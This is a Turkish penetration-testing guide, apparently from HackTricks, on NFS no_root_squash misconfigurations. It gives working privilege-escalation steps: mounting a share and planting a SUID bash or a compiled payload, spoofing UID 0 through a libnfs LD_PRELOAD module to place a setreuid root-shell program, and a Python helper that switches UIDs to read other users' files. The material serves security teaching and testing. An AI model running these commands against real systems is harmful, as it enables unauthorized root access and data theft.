# NFS No Root Squash Yanlış Yapılandırmasıyla Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## Squashing Temel Bilgiler

NFS AUTH_SYS/AUTH_UNIX ile sunucu, dosya izinlerini her RPC isteğinde gönderilen `uid` ve `gid` değerlerine göre denetler. Kerberos gibi diğer güvenlik türleri farklı kimlik bilgileri kullanır ve sunucu, izinleri denetlemeden önce sayısal kimlik bilgilerini eşleyebilir.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Tüm UID ve GID değerlerini varsayılan olarak Linux'ta `nobody` (65534) olan anonim hesaba eşler. Root olmayan istekler için varsayılan ayar `no_all_squash` seçeneğidir.<sup>[[4]](#references)</sup>
- **`root_squash`**: Linux'ta varsayılan ayardır ve UID/GID 0 (root) içeren istekleri anonim hesaba eşler; diğer UID ve GID değerleri eşlenmez.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Root squashing'i devre dışı bırakır; böylece UID/GID 0 içeren istekler sunucuda root olarak değerlendirilebilir.<sup>[[4]](#references)</sup>

İzin verilen bir istemci, **`no_root_squash`** ile yapılandırılmış **`/etc/exports`** içindeki yazılabilir bir export'u mount edebilirse, UID/GID 0 istekleriyle buraya sunucunun root kullanıcısı olarak yazabilir.<sup>[[4]](#references)</sup>

`root_squash` yalnızca UID/GID 0 değerlerini yeniden eşler; AUTH_SYS altında, izin verilen bir istemcinin **sıfır olmayan sayısal UID/GID** değerleri sunucudaki farklı bir hesapla eşleşebilir. Bu nedenle, istemci söz konusu sayısal kimlikle dosya oluşturabiliyorsa ve sunucu erişime izin veriyorsa, yazılabilir bir export root squashing etkin olsa bile kullanıcılar arası bir yol hâline gelebilir. SUID/SGID devri için ortaya çıkan dosyanın sahibini, çalıştırma erişimini, sunucu mount'ının `nosuid` durumunu, ACL'leri ve SELinux ya da diğer ilkeleri de doğrulayın. Yalnızca export yolunun, `rw` seçeneğinin veya eşleşen sayısal değerin varlığı; istemcinin erişim izni olduğunu, export'un etkin olduğunu ya da iki ana makinenin aynı etkin kimlik eşlemesini kullandığını kanıtlamaz. Numaralandırma sırasında `/etc/exports` dosyasını ve yerel meta verileri pasif olarak inceleyin; yeni bir paylaşımı mount etmeyin veya test dosyası oluşturmayın.<sup>[[4]](#references)[[5]](#references)</sup>

**NFS** hakkında daha fazla bilgi için:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Yetki Yükseltme

### Uzaktan Exploit

Bash kullanarak 1. seçenek:
- İzin verilen bir istemcide, yazılabilir bir export'u root olarak mount edin, **`/bin/bash`** dosyasını buraya kopyalayın, **SUID** bitini ayarlayın ve `nosuid` kullanmayan bir kurban mount'ından çalıştırın.<sup>[[2]](#references)[[4]](#references)</sup>
    - Yüklenen dosyanın sahibi root olarak kalacaksa sunucu **`no_root_squash`** kullanmalıdır. Root squashed edilirse, başka bir hesap için SUID binary oluşturmak ancak istemcinin o hesabın sayısal UID/GID değeriyle meşru olarak dosya oluşturabilmesi veya dosyanın sahibi olabilmesi durumunda mümkündür.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Seçenek 2, derlenmiş C kodu kullanarak:
- İzin verilen bir istemciden dizini mount edin, **SUID** izinlerini kötüye kullanan derlenmiş bir payload'ı buraya kopyalayın, **SUID** bitini ayarlayın ve kurban makinede çalıştırın (bazı [C SUID payload'ları](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) için bkz.).
    - Öncekiyle aynı kısıtlamalar

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Yerel Exploit

> [!TIP]
> Makinenizden kurban makineye bir **tünel oluşturabiliyorsanız, bu ayrıcalık yükseltmesini kullanmak için gerekli portları tünelleyerek Remote sürümünü kullanmaya devam edebilirsiniz**.\
> `/etc/exports` dışa aktarımı kurbanın IP adresiyle kısıtladığında şu yöntem işe yarar: uzak istemci dışa aktarımı bağlayamaz, ancak yerel teknik izin verilen ana bilgisayarda zaten bağlanmış paylaşım üzerinden çalışabilir.<sup>[[2]](#references)</sup>\
> Bu ayrıcalıksız libnfs yöntemi için, sürecin ayrılmış olmayan bir kaynak portu kullanabilmesi amacıyla **`/etc/exports`** içindeki dışa aktarımda `insecure` bayrağı bulunmalıdır; varsayılan `secure`'dür, ancak ayrılmış bir porta bağlanabilen bir sürecin bu seçeneğe ihtiyacı yoktur.<sup>[[1]](#references)[[4]](#references)</sup>

### Temel Bilgiler

Bir NFSv3 AUTH_UNIX istemcisi her çağrıda etkin UID, GID ve gruplarını içerir; sunucu bunları izin denetimleri için kullanır. Bu yerel teknik, [libnfs](https://github.com/sahlberg/libnfs) aracılığıyla RPC kimlik bilgilerini sahteleyerek bu modelden yararlanır; libnfs'nin preload modülü, NFS bağlamındaki UID/GID değerlerinin değiştirilmesini destekler.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Kütüphaneyi Derleme

libnfs örneği hedef kernel için uyarlama gerektirebilir; burada kullanılan kılavuzda, preload modülünü derlemeden önce fallocate syscall'larının yorum satırına alınması özellikle belirtilmiştir.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Exploit'in Uygulanması

Örnek, bir shell başlatan küçük bir C yardımcı programı oluşturur, ardından bunu paylaşım dizinine koyar ve NFS bağlamında UID 0 ile `ld_nfs.so` kullanarak SUID-root yapar.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Exploit kodunu derleyin:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Exploit'i share üzerine yerleştirin ve UID'yi taklit ederek izinlerini değiştirin**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Root yetkileri elde etmek için exploit'i çalıştırın**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Bonus: NFShell ile Gizli Dosya Erişimi

Root erişimi elde edildikten sonra bu `nfsh.py` kalıbı, bir komutu çalıştırmadan önce effective UID'yi hedef dosyanın UID'sine ayarlar ve böylece sahipliği recursive olarak değiştirmeden erişim sağlar.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Şöyle çalıştır:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Daha az bilinen bir NFS privesc hikâyesi](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: NFS Sürüm 3 Protokol Belirtimi](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
